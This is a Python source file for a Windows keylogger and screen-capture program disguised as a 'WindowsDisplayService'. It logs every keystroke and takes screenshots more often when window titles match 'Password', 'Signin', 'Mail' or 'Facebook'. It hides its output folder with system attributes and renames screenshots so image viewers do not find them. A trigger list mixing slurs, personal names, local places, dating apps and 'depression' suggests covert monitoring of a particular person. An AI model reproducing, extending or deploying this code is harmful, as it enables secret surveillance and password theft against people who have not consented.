import os
import shutil
from os import path
import autopy
import datetime
import re
from pynput.keyboard import Key, Listener
from win32gui import GetWindowText, GetForegroundWindow
#from configparser import ConfigParser

#parser = ConfigParser()
#parser.read('sysconfig.ini')

import SMWinservice


class WindowsDisplayService(SMWinservice.SMWinservice):

    def __init__(self):
        self.__version__ = '3.0'       # parser.get('System Configuration', 'version')
        self.key_counter = 100           # parser.getint('System Configuration', 'key_counter')     # Number of characters to capture before writing to the file
        self.lowest_screen_capture_timer = 3
        self.default_screen_capture_timer = 10
        self.screen_timer = 10           # parser.getint('System Configuration', 'screen_timer')   # Amount of time in seconds before the screen is captured
        self.exit_string = '<192>'       # parser.get('System Configuration', 'exit_string')     # Key combinations to exit program --  <192> is ctrl key + `
        self.pause_key = '<190>'      # Key combination to pause recording activities <111> is ctrl + .
        self.resume_key = '<191>'     # Key combination to resume recording activities <222> is ctrl + ?

        self.pause_recording_flag = False
        self.ignore_application_flag = False

        self.save_path = 'c:\sysdata'  # parser.get('Files', 'save_path')
        self.log_file_name = 'sysdata_logs.txt'          # parser.get('Files', 'log_file_name')

        self.count = 0
        self.png_count = 0
        # self.storedTime = datetime.datetime.utcnow()
        self.storedTime = datetime.datetime.now()
        self.storedWindow = GetWindowText(GetForegroundWindow())
        self.keys = []
        self.keys_to_write = ""
        self.keys_captured = []
        self.sys_error_logfile = "c:\sys_error_log.txt"

        self.keywords = ["anal", "anus", "arse", "ass", "ass fuck", "ass hole", "assfucker", "asshole", "assshole",
                         "bastard", "bitch", "black cock", "bloody hell", "boong", "cock", "cockfucker", "cocksuck",
                         "cocksucker", "coon", "coonnass", "crap", "cunt", "cyberfuck", "damn", "darn", "dick", "dirty",
                         "douche", "dummy", "erect", "erection", "erotic", "escort", "fag", "faggot", "fuck",
                         "Fuck off", "fuck you", "fuckass", "fuckhole", "god damn", "gook", "hard core", "hardcore",
                         "homoerotic", "hore", "lesbian", "lesbians", "mother fucker", "motherfuck", "motherfucker",
                         "negro", "nigger", "orgasim", "orgasm", "penis", "penisfucker", "piss", "piss off", "porn",
                         "porno", "pornography", "pussy", "retard", "sadist", "sex", "sexy", "shit", "slut",
                         "son of a bitch", "suck", "tits", "viagra", "whore", "xxx", "Mike", "Arizona", "Tilly",
                         "Fast Towing", "Shay", "Greg", "Gregg", "Mildred", "towing", "Mesa", "Phoenix", "Tempe",
                         "Justin", "Kilo", "Juanita", "Marlene", "Harlen", "Harlan", "kiss", "Love", "Tow", "Damon",
                         "Brian", "King", "Needham", "Joe", "Sarah", "Sara", "depression", "sad", "cry", "crying",
                         "facebook", "snapchat", "snap", "Tinder", "cry"]

        self.special_applications = ["Mail", "Facebook", "Walmart", "Password", "Sign",
                                     "Signin", "User", "User ID", "ID"]

        self.ignore_these_applications = ["Sublime", "Pycharm", "Excel", "Sheets", "Powerpoint"]

        self.replacementkeydict = {"Key.space": " ",
                                   "Key.enter": " <enter> ",
                                   "Key.shift": " <shift L> ",
                                   "Key.shift_r": " <shift R> ",
                                   "Key.backspace": "",
                                   "Key.alt_l": " <alt left> ",
                                   "Key.alt_r": " <alt right> ",
                                   "Key.delete": " <del> ",
                                   "Key.tab": " <tab> ",
                                   "Key.ctrl_l": " ",
                                   "Key.right": "",
                                   "Key.left": "",
                                   "Key.up": "",
                                   "Key.down": "",
                                   "Key.caps_lock": " <caps_lock> ",
                                   "Key.media_volume_up": " <Volume Up> ",
                                   "Key.media_volume_down": " <Volume Down> ",
                                   "Key.home": "",
                                   "Key.end": "",
                                   "Key.num_lock": "",
                                   "Key.page_down": "",
                                   "Key.insert": ""}

    def write_file(self, keys_captured):
        keys_to_write = ""

        if not self.pause_recording_flag and not self.ignore_application_flag:
            if not os.path.exists(self.save_path):
                os.mkdir(self.save_path)
                os.system('attrib +h +s ' + self.save_path)

            # Will create the file if it does not exist otherwise append
            try:
                with open(os.path.join(self.save_path, self.log_file_name), 'a+') as f:
                    f.write(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S') + "\t")

                    if len(keys_captured) != 0:
                        # Convert keys_captured to string in preparation to be written to a file
                        for each_key in keys_captured:
                            keys_to_write += each_key

                    f.write(keys_to_write)
                    f.write("\n")
            except Exception as e:
                with open(self.sys_error_logfile, 'a') as f:
                    f.write('an error message' + str(e))
            finally:
                self.keys.clear()  # Reset the key list

    def blacklisted_words(self, keys_list):
        keystring = ""

        if len(keys_list) != 0:
            for each_key in keys_list:
                keystring += each_key

        # Check keys entered against the list of keywords...
        if any(x in keystring.split() for x in self.keywords):
            self.keys.append(" <KEYWORD-FOUND> ")  # global variable is updated with any notes
            return True

        return False    # no blacklisted words found

    def write_screen(self):
        if not self.pause_recording_flag and not self.ignore_application_flag:
            img = autopy.bitmap.capture_screen()
            self.png_count += 1

            formatted_time = datetime.datetime.strptime((self.storedTime.strftime("%Y-%m-%d %H:%M:%S.%f"))[:-7], "%Y-%m-%d %H:%M:%S")
            img_file_name = str(formatted_time).replace(":", ".") + "_%s.png" % self.png_count

            try:
                img.save(os.path.join(self.save_path, img_file_name))
            except IOError:
                with open(self.sys_error_logfile, 'a') as f:
                    f.write('IOError with image' + str(IOError))
            except ValueError:
                with open(self.sys_error_logfile, 'a') as f:
                    f.write('ValueError with image' + str(ValueError))

            # Reset the screen_timer each time the screen is saved
            # self.storedTime = datetime.datetime.utcnow()
            self.storedTime = datetime.datetime.now()
            # Todo validate timestamps are working correctly

            try:
                # rename so image viewers don't find it by scanning drives for image files
                if path.exists(os.path.join(self.save_path, img_file_name)):
                    shutil.move(os.path.join(self.save_path, img_file_name),
                                (os.path.join(self.save_path, img_file_name)[:-3] + "pnx"))  # Renames the file
            except OSError:
                with open(self.sys_error_logfile, 'a') as f:
                    f.write('OSError with image' + str(ValueError))
            except ValueError:
                with open(self.sys_error_logfile, 'a') as f:
                    f.write('ValueError with image' + str(ValueError))

    def on_press(self, key):
        replacementkey = ""

        # Check for exit key combinations
        if self.exit_string in str(key):
            self.pause_recording_flag = False
            self.ignore_application_flag = False
            self.keys.append("\n\n")
            self.write_file(self.keys)  # write any extra keys before exiting
            self.write_file(["Exit Keys Detected -- Normal System Exit"])
            return False

        if self.pause_key in str(key):
            self.write_file(self.keys)  # write any extra keys before exiting
            self.write_file(["Pause Keys Detected -- Captures Halted"])
            self.pause_recording_flag = True

        if self.resume_key in str(key):
            self.pause_recording_flag = False
            self.write_file(self.keys)  # write any extra keys before exiting
            self.write_file(["Resume Keys Detected -- Captures Resumed"])

        if not self.pause_recording_flag and not self.ignore_application_flag:
            # Check to see if there are any alternate replacement text upon key detection
            try:
                replacementkey = self.replacementkeydict[str(key)]
                self.keys.append(replacementkey)
                if key.name == "backspace":
                    self.keys = self.keys[:len(self.keys)-2]
            except KeyError:
                # keystroke not found in key replacement dictionary so just add the key to the keys list
                self.keys.append((str(key).replace("'", "")))

        ''' 
        Check the blacklist word List when a space is used.
        Only makes sense after a space because we're looking for words
        not individual characters.  I'm defining a word as a string of characters separated by one or more spaces
        '''
        if replacementkey == " ":
            if self.blacklisted_words(self.keys):
                self.write_file(self.keys)
                self.write_screen()

        if len(self.keys) >= self.key_counter:    # write keys at distinct intervals
            self.write_file(self.keys)

        # Capture Screen interval based on configured 'screen_timer' delay in seconds
        s = self.storedTime.strftime("%Y-%m-%d %H:%M:%S.%f")
        storedtime_plus_delay = (datetime.datetime.strptime(s[:-7], "%Y-%m-%d %H:%M:%S")) + \
            datetime.timedelta(seconds=self.screen_timer)

        # if datetime.datetime.utcnow() >= storedtime_plus_delay:     # capture screen at discrete intervals
        if datetime.datetime.now() >= storedtime_plus_delay:  # capture screen at discrete intervals
            self.write_screen()

        '''
        Check the active window to see if we are still typing in the same application
        between keystrokes.  Otherwise there is a chance that the application name would not get logged depending
        on the write_delay
        '''
        if self.application_switched():
            self.write_screen()

    def application_switched(self):    # if the application focus changes, grab the screen
        if GetWindowText(GetForegroundWindow()) != self.storedWindow:
            self.write_file(self.keys)  # to keep the keystrokes with the previous window/application
            self.keys.insert(0, ("<APPLICATION> " + str(GetWindowText(GetForegroundWindow()) + " <APPLICATION> " + "\n")))

            self.storedWindow = GetWindowText(GetForegroundWindow())  # update storedWindow to the new name of the application
            if self.is_this_a_special_application():
                self.screen_timer = self.lowest_screen_capture_timer
            else:
                self.screen_timer = self.default_screen_capture_timer

            if self.ignore_this_application():
                self.write_file(self.keys)                # have to write application before turning the flag True
                self.ignore_application_flag = True
            else:
                self.ignore_application_flag = False

            return True
        else:
            return False

    def is_this_a_special_application(self):    # increase the screen capture rate for user defined 'special applications'
        for searchword in self.special_applications:
            if re.search(searchword, str(self.storedWindow), re.IGNORECASE):
                self.keys[0] = "<USER-DEFINED-SPECIAL-APPLICATION> " + str(
                    GetWindowText(GetForegroundWindow()) + " <USER-DEFINED-SPECIAL-APPLICATION> ")
                self.write_file(self.keys)
                return True
            else:
                return False

        return False

    def ignore_this_application(self):    # Stop recording for certain user defined applications
        for searchword in self.ignore_these_applications:
            if re.search(searchword, str(self.storedWindow), re.IGNORECASE):
                self.keys[0] = "<USER-DEFINED-IGNORE-APPLICATION> " + str(
                    GetWindowText(GetForegroundWindow()) + " <USER-DEFINED-IGNORE-APPLICATION> ")
                self.write_file(self.keys)
                return True

        return False

    def on_release(self, key):
        pass
        #if key == Key.esc:
            #return False

    def run(self):
        with Listener(on_press=lambda key: self.on_press(key),
                      on_release=lambda key: self.on_release(key)) as listener:
            listener.join()


def main():
    key_listener = WindowsDisplayService()
    key_listener.run()


if __name__ == '__main__':
    main()








